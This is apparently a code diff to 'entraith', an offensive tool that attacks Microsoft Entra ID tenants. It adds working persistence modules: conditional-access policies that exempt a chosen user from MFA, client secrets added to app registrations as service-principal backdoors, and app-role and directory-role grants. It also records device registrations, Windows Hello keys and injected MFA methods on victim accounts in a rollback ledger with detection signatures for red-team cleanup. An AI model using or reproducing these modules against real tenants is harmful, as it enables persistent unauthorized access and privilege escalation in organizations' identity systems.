@@ -2,6 +2,7 @@ package api
 
 import (
 	"context"
+	"database/sql"
 	"encoding/csv"
 	"encoding/json"
 	"fmt"
@@ -13,6 +14,7 @@ import (
 
 	"github.com/bl4cksku11/entraith/internal/auth"
 	"github.com/bl4cksku11/entraith/internal/campaigns"
+	"github.com/bl4cksku11/entraith/internal/ledger"
 	"github.com/bl4cksku11/entraith/internal/mailer"
 	"github.com/bl4cksku11/entraith/internal/modules/devicecode"
 	"github.com/bl4cksku11/entraith/internal/modules/devicereg"
@@ -193,6 +195,13 @@ func (h *Handler) Routes() http.Handler {
 	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/clone-group", h.graphCloneGroup)
 	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/users", h.graphSearchUsers)
 	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/conditional-access", h.graphDumpConditionalAccess)
+
+	// Persistence modules (mutating) — all recorded in the deployment ledger
+	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/ca-exclusion", h.graphCreateCAExclusion)
+	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/add-app-password", h.graphAddAppPassword)
+	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/assign-app-role", h.graphAssignAppRole)
+	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/assign-directory-role", h.graphAssignDirectoryRole)
+	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/find-sp", h.graphFindServicePrincipal)
 	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/apps", h.graphDumpApps)
 	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/grants", h.graphGetGrants)
 	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/me", h.graphGetMe)
@@ -294,6 +303,13 @@ func (h *Handler) Routes() http.Handler {
 	mux.HandleFunc("GET /api/winhello-keys", h.listWinHelloKeys)
 	mux.HandleFunc("POST /api/winhello-keys", h.registerWinHelloKey)
 	mux.HandleFunc("DELETE /api/winhello-keys/{id}", h.deleteWinHelloKey)
+
+	// Deployment ledger / teardown — every mutation pushed into a target tenant,
+	// with one-click rollback for guaranteed engagement cleanup.
+	mux.HandleFunc("GET /api/artifacts", h.listArtifacts)
+	mux.HandleFunc("POST /api/artifacts/{artId}/rollback", h.rollbackArtifact)
+	mux.HandleFunc("GET /api/campaigns/{id}/artifacts", h.listCampaignArtifacts)
+	mux.HandleFunc("POST /api/campaigns/{id}/teardown", h.teardownCampaign)
 
 	// OTP secrets / TOTP
 	mux.HandleFunc("GET /api/otp-secrets", h.listOTPSecrets)
@@ -1474,6 +1490,22 @@ func (h *Handler) graphDeployApp(w http.ResponseWriter, r *http.Request) {
 		writeError(w, 500, err.Error())
 		return
 	}
+	var app struct {
+		ID    string `json:"id"`
+		AppID string `json:"appId"`
+	}
+	json.Unmarshal(result, &app)
+	if app.ID != "" {
+		h.recordArtifact(ledger.Artifact{
+			CampaignID: id, TargetID: targetID, OperatorID: operatorID(r),
+			Type: ledger.TypeAppRegistration, ObjectID: app.ID, DisplayName: body.DisplayName,
+			ReqMethod: "POST", ReqURL: "/applications",
+			RollbackKind: ledger.RollbackGraph, RollbackMethod: "DELETE",
+			RollbackURL:        "/applications/" + app.ID,
+			DetectionSignature: "AuditLog: Add application / Add service principal",
+			Note:               "appId=" + app.AppID,
+		})
+	}
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
@@ -1541,6 +1573,226 @@ func (h *Handler) graphCloneGroup(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	result, err := gc.CloneGroup(context.Background(), body.SourceGroupID, body.NewDisplayName, body.Description)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	if gid := methodIDFromResult(result); gid != "" {
+		h.recordArtifact(ledger.Artifact{
+			CampaignID: id, TargetID: targetID, OperatorID: operatorID(r),
+			Type: ledger.TypeGroupClone, ObjectID: gid, DisplayName: body.NewDisplayName,
+			ReqMethod: "POST", ReqURL: "/groups",
+			RollbackKind: ledger.RollbackGraph, RollbackMethod: "DELETE",
+			RollbackURL:        "/groups/" + gid,
+			DetectionSignature: "AuditLog: Add group",
+			Note:               "cloned from " + body.SourceGroupID,
+		})
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+// ─── Persistence modules: CA exclusion, SP backdoor, role assignment ──────────
+// Each mutating persistence operation records a deployment-ledger entry with a
+// Graph-kind (auto-revertible) rollback descriptor.
+
+const graphAppID = "00000003-0000-0000-c000-000000000000" // Microsoft Graph SP appId
+
+func (h *Handler) graphCreateCAExclusion(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
+	var body struct {
+		DisplayName   string `json:"display_name"`
+		ExcludeUserID string `json:"exclude_user_id"`
+		State         string `json:"state"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.DisplayName == "" || body.ExcludeUserID == "" {
+		writeError(w, 400, "display_name and exclude_user_id required")
+		return
+	}
+	// Safe default: report-only. The operator opts into "enabled" for real
+	// enforcement; either way the policy is logged and torn down via the ledger.
+	if body.State == "" {
+		body.State = "enabledForReportingButNotEnforced"
+	}
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	policy := map[string]interface{}{
+		"displayName": body.DisplayName,
+		"state":       body.State,
+		"conditions": map[string]interface{}{
+			"applications":   map[string]interface{}{"includeApplications": []string{"All"}},
+			"users":          map[string]interface{}{"includeUsers": []string{"All"}, "excludeUsers": []string{body.ExcludeUserID}},
+			"clientAppTypes": []string{"all"},
+		},
+		"grantControls": map[string]interface{}{"operator": "OR", "builtInControls": []string{"mfa"}},
+	}
+	result, err := gc.CreateConditionalAccessPolicy(context.Background(), policy)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	if pid := methodIDFromResult(result); pid != "" {
+		h.recordArtifact(ledger.Artifact{
+			CampaignID: id, TargetID: targetID, OperatorID: operatorID(r),
+			Type: ledger.TypeCAPolicy, ObjectID: pid, DisplayName: body.DisplayName,
+			ReqMethod: "POST", ReqURL: "/identity/conditionalAccess/policies",
+			RollbackKind: ledger.RollbackGraph, RollbackMethod: "DELETE",
+			RollbackURL:        "/identity/conditionalAccess/policies/" + pid,
+			DetectionSignature: "AuditLog: Add/Update conditional access policy",
+			Note:               "CA policy excluding " + body.ExcludeUserID + " (state=" + body.State + ")",
+		})
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphAddAppPassword(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
+	var body struct {
+		AppObjectID string `json:"app_object_id"`
+		DisplayName string `json:"display_name"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.AppObjectID == "" {
+		writeError(w, 400, "app_object_id required")
+		return
+	}
+	if body.DisplayName == "" {
+		body.DisplayName = "client-secret"
+	}
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.AddAppPassword(context.Background(), body.AppObjectID, body.DisplayName)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	// addPassword returns keyId (used to revoke) + secretText (shown to the
+	// operator once; never persisted in the ledger).
+	var pwd struct {
+		KeyID string `json:"keyId"`
+	}
+	json.Unmarshal(result, &pwd)
+	if pwd.KeyID != "" {
+		h.recordArtifact(ledger.Artifact{
+			CampaignID: id, TargetID: targetID, OperatorID: operatorID(r),
+			Type: ledger.TypeSPCredential, ObjectID: pwd.KeyID, DisplayName: body.DisplayName,
+			ReqMethod: "POST", ReqURL: "/applications/" + body.AppObjectID + "/addPassword",
+			RollbackKind: ledger.RollbackGraph, RollbackMethod: "POST",
+			RollbackURL:        "/applications/" + body.AppObjectID + "/removePassword",
+			RollbackBody:       `{"keyId":"` + pwd.KeyID + `"}`,
+			DetectionSignature: "AuditLog: Add service principal credentials / Update application – Certificates & secrets",
+			SecretRef:          "returned to operator once; not stored",
+			Note:               "client secret added to app " + body.AppObjectID,
+		})
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphAssignAppRole(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
+	var body struct {
+		ResourceSpID string `json:"resource_sp_id"`
+		PrincipalID  string `json:"principal_id"`
+		AppRoleID    string `json:"app_role_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.ResourceSpID == "" || body.PrincipalID == "" || body.AppRoleID == "" {
+		writeError(w, 400, "resource_sp_id, principal_id and app_role_id required")
+		return
+	}
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.AssignAppRole(context.Background(), body.ResourceSpID, body.PrincipalID, body.AppRoleID)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	if aid := methodIDFromResult(result); aid != "" {
+		h.recordArtifact(ledger.Artifact{
+			CampaignID: id, TargetID: targetID, OperatorID: operatorID(r),
+			Type: ledger.TypeAppRoleAssignment, ObjectID: aid, DisplayName: "app role " + body.AppRoleID,
+			ReqMethod: "POST", ReqURL: "/servicePrincipals/" + body.ResourceSpID + "/appRoleAssignedTo",
+			RollbackKind: ledger.RollbackGraph, RollbackMethod: "DELETE",
+			RollbackURL:        "/servicePrincipals/" + body.ResourceSpID + "/appRoleAssignedTo/" + aid,
+			DetectionSignature: "AuditLog: Add app role assignment to service principal",
+			Note:               "granted to principal " + body.PrincipalID,
+		})
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphAssignDirectoryRole(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
+	var body struct {
+		PrincipalID      string `json:"principal_id"`
+		RoleDefinitionID string `json:"role_definition_id"`
+		DirectoryScopeID string `json:"directory_scope_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.PrincipalID == "" || body.RoleDefinitionID == "" {
+		writeError(w, 400, "principal_id and role_definition_id required")
+		return
+	}
+	gc, err := h.graphClient(id, targetID)
+	if err != nil {
+		writeError(w, 404, err.Error())
+		return
+	}
+	result, err := gc.AssignDirectoryRole(context.Background(), body.PrincipalID, body.RoleDefinitionID, body.DirectoryScopeID)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	if aid := methodIDFromResult(result); aid != "" {
+		h.recordArtifact(ledger.Artifact{
+			CampaignID: id, TargetID: targetID, OperatorID: operatorID(r),
+			Type: ledger.TypeRoleAssignment, ObjectID: aid, DisplayName: "role " + body.RoleDefinitionID,
+			ReqMethod: "POST", ReqURL: "/roleManagement/directory/roleAssignments",
+			RollbackKind: ledger.RollbackGraph, RollbackMethod: "DELETE",
+			RollbackURL:        "/roleManagement/directory/roleAssignments/" + aid,
+			DetectionSignature: "AuditLog: Add member to role",
+			Note:               "assigned to principal " + body.PrincipalID,
+		})
+	}
+	w.Header().Set("Content-Type", "application/json")
+	w.Write(result)
+}
+
+func (h *Handler) graphFindServicePrincipal(w http.ResponseWriter, r *http.Request) {
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
+		return
+	}
+	appID := r.URL.Query().Get("appId")
+	if appID == "" {
+		appID = graphAppID
+	}
+	result, err := gc.GetServicePrincipalByAppID(context.Background(), appID)
 	if err != nil {
 		writeError(w, 500, err.Error())
 		return
@@ -2823,6 +3075,7 @@ func (h *Handler) mfaAddPhone(w http.ResponseWriter, r *http.Request) {
 		writeError(w, 500, err.Error())
 		return
 	}
+	h.recordMFAArtifact(r, "phone", methodIDFromResult(result))
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
@@ -2842,6 +3095,7 @@ func (h *Handler) mfaAddEmail(w http.ResponseWriter, r *http.Request) {
 		writeError(w, 500, err.Error())
 		return
 	}
+	h.recordMFAArtifact(r, "email", methodIDFromResult(result))
 	w.Header().Set("Content-Type", "application/json")
 	w.Write(result)
 }
@@ -2880,6 +3134,7 @@ func (h *Handler) mfaAddApp(w http.ResponseWriter, r *http.Request) {
 		writeError(w, 500, err.Error())
 		return
 	}
+	h.recordMFAArtifact(r, "authenticator app", methodIDFromResult(result))
 	w.Header().Set("Content-Type", "application/json")
 	// Merge init and add responses for the frontend
 	merged := map[string]interface{}{}
@@ -3213,11 +3468,11 @@ outer:
 	}
 
 	_ = h.Store.InsertExchangedToken(store.ExchangedTokenRow{
-		ID:          ex.ID,
-		CampaignID:  campaignID,
-		TargetID:    targetID,
-		TargetEmail: ex.TargetEmail,
-		Label:       ex.Label,
+		ID:           ex.ID,
+		CampaignID:   campaignID,
+		TargetID:     targetID,
+		TargetEmail:  ex.TargetEmail,
+		Label:        ex.Label,
 		AccessToken:  result.AccessToken,
 		RefreshToken: result.RefreshToken,
 		Scope:        result.Scope,
@@ -3293,6 +3548,17 @@ func (h *Handler) createDeviceCert(w http.ResponseWriter, r *http.Request) {
 		JoinType: cert.JoinType, Certificate: cert.Certificate,
 		PrivateKey: cert.PrivateKeyPEM, TargetDomain: cert.TargetDomain,
 		CreatedAt: cert.CreatedAt,
+	})
+	h.recordArtifact(ledger.Artifact{
+		OperatorID: operatorID(r),
+		Type:       ledger.TypeDeviceRegistration, ObjectID: cert.DeviceID, DisplayName: cert.Label,
+		TenantID:  cert.TargetDomain,
+		ReqMethod: "POST", ReqURL: "enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0",
+		RollbackKind: ledger.RollbackDRS, RollbackMethod: "DELETE",
+		RollbackURL:        "Graph: DELETE /devices(deviceId='" + cert.DeviceID + "')  — look up the directory object id first",
+		DetectionSignature: "AuditLog: Register device / Add device",
+		SecretRef:          "device_certs/" + cert.ID,
+		Note:               fmt.Sprintf("Virtual device registered in tenant (join_type=%d). Remove the device object from Entra ID to revoke.", cert.JoinType),
 	})
 	json.NewEncoder(w).Encode(map[string]string{"id": cert.ID, "deviceId": cert.DeviceID, "label": cert.Label})
 }
@@ -3482,12 +3748,220 @@ func (h *Handler) registerWinHelloKey(w http.ResponseWriter, r *http.Request) {
 		KeyID: key.KeyID, PrivateKey: key.PrivateKeyPEM,
 		TargetUPN: key.TargetUPN, CreatedAt: key.CreatedAt,
 	})
+	h.recordArtifact(ledger.Artifact{
+		OperatorID: operatorID(r),
+		Type:       ledger.TypeWinHelloKey, ObjectID: key.KeyID, DisplayName: key.Label,
+		ReqMethod: "POST", ReqURL: "enterpriseregistration.windows.net/EnrollmentServer/key/?api-version=1.0",
+		RollbackKind: ledger.RollbackManual, RollbackMethod: "DELETE",
+		RollbackURL:        "Graph: DELETE /users/" + key.TargetUPN + "/authentication/windowsHelloForBusinessMethods/{id}",
+		DetectionSignature: "AuditLog: User registered security info (Windows Hello for Business)",
+		SecretRef:          "winhello_keys/" + key.ID,
+		Note:               "Attacker WHfB NGC key bound to device cert " + key.DeviceCertID + " and user " + key.TargetUPN + ". Remove the WHfB method from the user to revoke.",
+	})
 	json.NewEncoder(w).Encode(map[string]string{"id": key.ID, "keyId": key.KeyID})
 }
 
 func (h *Handler) deleteWinHelloKey(w http.ResponseWriter, r *http.Request) {
 	h.Store.DeleteWinHelloKey(r.PathValue("id"))
 	w.WriteHeader(204)
+}
+
+// ─── Deployment ledger / teardown ─────────────────────────────────────────────
+//
+// Every mutation entraith pushes into a target tenant is recorded in the
+// deployment ledger with a rollback descriptor, so an engagement can be torn
+// down cleanly and the deployment is auditable evidence (and a purple-team
+// detection map). Recording never blocks the offensive operation.
+
+func operatorID(r *http.Request) string {
+	if u := userFromCtx(r); u != nil {
+		return u.ID
+	}
+	return ""
+}
+
+func (h *Handler) recordArtifact(a ledger.Artifact) {
+	if a.ID == "" {
+		a.ID = fmt.Sprintf("art-%d", time.Now().UnixNano())
+	}
+	if a.CreatedAt.IsZero() {
+		a.CreatedAt = time.Now().UTC()
+	}
+	if a.Status == "" {
+		a.Status = ledger.StatusDeployed
+	}
+	if a.RollbackKind == "" {
+		a.RollbackKind = ledger.RollbackManual
+	}
+	if err := h.Store.InsertArtifact(artifactToRow(a)); err != nil {
+		log.Printf("ledger: failed to record %s artifact: %v", a.Type, err)
+	}
+}
+
+func artifactToRow(a ledger.Artifact) store.DeployedArtifactRow {
+	row := store.DeployedArtifactRow{
+		ID: a.ID, CampaignID: a.CampaignID, TargetID: a.TargetID, OperatorID: a.OperatorID,
+		Type: a.Type, TenantID: a.TenantID, ObjectID: a.ObjectID, DisplayName: a.DisplayName,
+		ReqMethod: a.ReqMethod, ReqURL: a.ReqURL, ReqBody: a.ReqBody,
+		RollbackKind: a.RollbackKind, RollbackMethod: a.RollbackMethod, RollbackURL: a.RollbackURL, RollbackBody: a.RollbackBody,
+		DetectionSignature: a.DetectionSignature, SecretRef: a.SecretRef,
+		Status: a.Status, Note: a.Note, CreatedAt: a.CreatedAt,
+	}
+	if a.RolledBackAt != nil {
+		row.RolledBackAt = sql.NullTime{Time: *a.RolledBackAt, Valid: true}
+	}
+	return row
+}
+
+func artifactFromRow(r store.DeployedArtifactRow) ledger.Artifact {
+	a := ledger.Artifact{
+		ID: r.ID, CampaignID: r.CampaignID, TargetID: r.TargetID, OperatorID: r.OperatorID,
+		Type: r.Type, TenantID: r.TenantID, ObjectID: r.ObjectID, DisplayName: r.DisplayName,
+		ReqMethod: r.ReqMethod, ReqURL: r.ReqURL, ReqBody: r.ReqBody,
+		RollbackKind: r.RollbackKind, RollbackMethod: r.RollbackMethod, RollbackURL: r.RollbackURL, RollbackBody: r.RollbackBody,
+		DetectionSignature: r.DetectionSignature, SecretRef: r.SecretRef,
+		Status: r.Status, Note: r.Note, CreatedAt: r.CreatedAt,
+	}
+	if r.RolledBackAt.Valid {
+		t := r.RolledBackAt.Time
+		a.RolledBackAt = &t
+	}
+	return a
+}
+
+// rollbackOne is the Rollbacker shared by single-artifact rollback and full
+// campaign teardown. Only Graph-kind artifacts with a reusable campaign token
+// are auto-reverted; everything else is surfaced for manual cleanup.
+func (h *Handler) rollbackOne(ctx context.Context, a ledger.Artifact) error {
+	if a.RollbackKind != ledger.RollbackGraph || a.CampaignID == "" || a.TargetID == "" {
+		return ledger.ErrManual
+	}
+	gc, err := h.graphClient(a.CampaignID, a.TargetID)
+	if err != nil {
+		return fmt.Errorf("no usable token for rollback: %w", err)
+	}
+	method := a.RollbackMethod
+	if method == "" {
+		method = "DELETE"
+	}
+	return gc.RollbackCall(ctx, method, a.RollbackURL, a.RollbackBody)
+}
+
+func (h *Handler) listArtifacts(w http.ResponseWriter, r *http.Request) {
+	rows, err := h.Store.ListArtifacts()
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	out := make([]ledger.Artifact, 0, len(rows))
+	for _, row := range rows {
+		out = append(out, artifactFromRow(row))
+	}
+	writeJSON(w, 200, out)
+}
+
+func (h *Handler) listCampaignArtifacts(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
+	rows, err := h.Store.ListArtifactsByCampaign(id)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	out := make([]ledger.Artifact, 0, len(rows))
+	for _, row := range rows {
+		out = append(out, artifactFromRow(row))
+	}
+	writeJSON(w, 200, out)
+}
+
+func (h *Handler) rollbackArtifact(w http.ResponseWriter, r *http.Request) {
+	row, err := h.Store.GetArtifact(r.PathValue("artId"))
+	if err != nil {
+		writeError(w, 404, "artifact not found")
+		return
+	}
+	a := artifactFromRow(*row)
+	results := ledger.Teardown(context.Background(), []ledger.Artifact{a}, h.rollbackOne)
+	if len(results) == 0 {
+		writeJSON(w, 200, map[string]string{"status": "already_rolled_back"})
+		return
+	}
+	res := results[0]
+	switch res.Status {
+	case ledger.StatusRolledBack:
+		h.Store.MarkArtifactRolledBack(a.ID, time.Now().UTC())
+	case ledger.StatusFailed:
+		h.Store.UpdateArtifactStatus(a.ID, ledger.StatusFailed)
+	}
+	writeJSON(w, 200, res)
+}
+
+func (h *Handler) teardownCampaign(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
+	rows, err := h.Store.ListArtifactsByCampaign(id)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	// Rows are newest-first, which is the correct teardown order: dependants
+	// are removed before the objects they depend on.
+	arts := make([]ledger.Artifact, 0, len(rows))
+	for _, row := range rows {
+		arts = append(arts, artifactFromRow(row))
+	}
+	results := ledger.Teardown(context.Background(), arts, h.rollbackOne)
+	now := time.Now().UTC()
+	var rolled, failed, manual int
+	for _, res := range results {
+		switch res.Status {
+		case ledger.StatusRolledBack:
+			h.Store.MarkArtifactRolledBack(res.ArtifactID, now)
+			rolled++
+		case ledger.StatusFailed:
+			h.Store.UpdateArtifactStatus(res.ArtifactID, ledger.StatusFailed)
+			failed++
+		case ledger.OutcomeSkippedManual:
+			manual++
+		}
+	}
+	writeJSON(w, 200, map[string]interface{}{
+		"rolled_back":    rolled,
+		"failed":         failed,
+		"skipped_manual": manual,
+		"results":        results,
+	})
+}
+
+// methodIDFromResult best-effort extracts an object "id" from a Graph/mysignins
+// response so a ledger entry can point its rollback at the created object.
+func methodIDFromResult(raw []byte) string {
+	var m map[string]interface{}
+	if json.Unmarshal(raw, &m) == nil {
+		if v, ok := m["id"].(string); ok {
+			return v
+		}
+	}
+	return ""
+}
+
+// recordMFAArtifact records an injected MFA method. Removal is via the My
+// Sign-Ins API and is session-bound, so it is surfaced for manual cleanup.
+func (h *Handler) recordMFAArtifact(r *http.Request, methodLabel, objectID string) {
+	h.recordArtifact(ledger.Artifact{
+		CampaignID: r.PathValue("id"), TargetID: r.PathValue("targetId"), OperatorID: operatorID(r),
+		Type: ledger.TypeMFAMethod, ObjectID: objectID, DisplayName: "MFA: " + methodLabel,
+		ReqMethod: "POST", ReqURL: "mysignins /authenticationmethods/new",
+		RollbackKind: ledger.RollbackMySignIns, RollbackMethod: "DELETE",
+		RollbackURL:        "MFA Management → Delete method " + objectID,
+		DetectionSignature: "AuditLog: User registered security info",
+		Note:               "Injected " + methodLabel + " MFA method on the victim account (session-bound; remove via MFA Management).",
+	})
 }
 
 // ─── OTP Secrets / TOTP ───────────────────────────────────────────────────────
